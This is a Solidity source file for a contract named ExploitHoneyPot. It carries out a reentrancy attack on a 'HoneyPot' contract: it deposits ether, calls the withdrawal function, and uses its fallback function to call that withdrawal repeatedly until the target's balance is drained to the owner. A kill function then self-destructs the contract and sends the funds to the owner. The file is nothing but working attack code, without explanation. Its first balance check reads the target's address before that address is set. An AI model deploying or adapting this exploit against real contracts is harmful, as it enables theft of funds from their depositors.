pragma solidity 0.4.24;

contract HoneyPotI { 
  function put() public payable;
  function get() public;
}

contract ExploitHoneyPot {
    
  uint256 startGas;
  address owner;
  HoneyPotI honeyPot;
      
  constructor () public {
    owner = msg.sender;
  }

  function exploit(address addrHoneyPot) public payable {
    require(msg.sender == owner,"Only the owner can do this.");
    require (msg.value <= address(honeyPot).balance,"Not enough funds..");
    
    honeyPot = HoneyPotI(addrHoneyPot);
    uint oldBalance = address(msg.sender).balance;

    honeyPot.put.value(msg.value)();
    honeyPot.get();
    require (address(msg.sender).balance > oldBalance,"You are losing ether!");
  }

  function kill () public {
    require(msg.sender == owner,"Only the owner can do this.");
    selfdestruct(msg.sender);
  }


  function () public payable  {
    if (startGas == 0){
      startGas = gasleft();
    }
  
    if (address(honeyPot).balance >= msg.value && gasleft() >  (startGas - gasleft()) ) {
      honeyPot.get();
    }
  }
}
